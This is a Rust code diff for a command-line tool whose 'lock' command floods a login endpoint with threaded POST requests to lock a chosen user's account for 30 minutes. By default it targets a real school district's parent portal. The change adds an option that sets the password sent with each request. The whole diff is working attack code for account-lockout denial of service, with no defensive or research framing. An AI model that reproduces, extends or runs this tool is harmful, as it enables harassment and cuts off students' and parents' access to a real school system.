@@ -23,7 +23,7 @@ pub fn command() -> Command {
     Command::new(
         "lock",
         "Lock an account for 30 min by sending lots of login requests",
-        "lock <username> [-t Threads] [-r Requests] [--page BasePage]",
+        "lock <username> [-t Threads] [-r Requests] [-p Password] [--page BasePage]",
         |args| {
             if args.len() <= 2 {
                 color_print!(Color::Red, "[*] Not enough args supplied");
@@ -40,6 +40,8 @@ pub fn command() -> Command {
                 .unwrap_or("15")
                 .parse::<u32>()
                 .unwrap();
+
+            let password: &str = &arg_parse::get_arg_value(&args, "-p").unwrap_or("🔒");
 
             let base_page: &str = &arg_parse::get_arg_value(&args, "--page")
                 .unwrap_or("https://parents.genesisedu.com/bernardsboe");
@@ -67,15 +69,16 @@ pub fn command() -> Command {
 
             color_print!(Color::Magenta, "[i] Threads: {}", &threads.to_string());
             color_print!(Color::Magenta, "[i] Requests: {}", &requests.to_string());
+            color_print!(Color::Magenta, "[i] Password: {}", &password);
             color_print!(Color::Magenta, "[i] Base Page: {}", &base_page);
             println!();
 
-            lock(&username, base_page, threads, requests);
+            lock(&username, password, base_page, threads, requests);
         },
     )
 }
 
-fn lock(username: &str, base_page: &str, threads: &u32, requests: &u32) {
+fn lock(username: &str, password: &str, base_page: &str, threads: &u32, requests: &u32) {
     // Start the timer
     let start_time = SystemTime::now();
 
@@ -94,7 +97,12 @@ fn lock(username: &str, base_page: &str, threads: &u32, requests: &u32) {
             requests += 1;
         }
         total_reqs += requests;
-        system.add_locker(Locker::new(&system.username, &login_page, requests));
+        system.add_locker(Locker::new(
+            &system.username,
+            &password,
+            &login_page,
+            requests,
+        ));
         if total_reqs >= system.req_count {
             break;
         }
@@ -140,6 +148,7 @@ fn lock(username: &str, base_page: &str, threads: &u32, requests: &u32) {
 
 struct Locker {
     page: String,
+    password: String,
     username: String,
     req_count: u32,
 }
@@ -153,9 +162,10 @@ struct System {
 }
 
 impl Locker {
-    fn new(username: &str, page: &str, req_count: u32) -> Locker {
+    fn new(username: &str, password: &str, page: &str, req_count: u32) -> Locker {
         Locker {
             page: page.to_string(),
+            password: password.to_string(),
             username: username.to_string(),
             req_count,
         }
@@ -171,7 +181,7 @@ impl Locker {
             let _ = agent
                 .post(&self.page)
                 .query("j_username", &self.username)
-                .query("j_password", "🔒")
+                .query("j_password", &self.password)
                 .call();
             unsafe {
                 REQUESTS += 1;
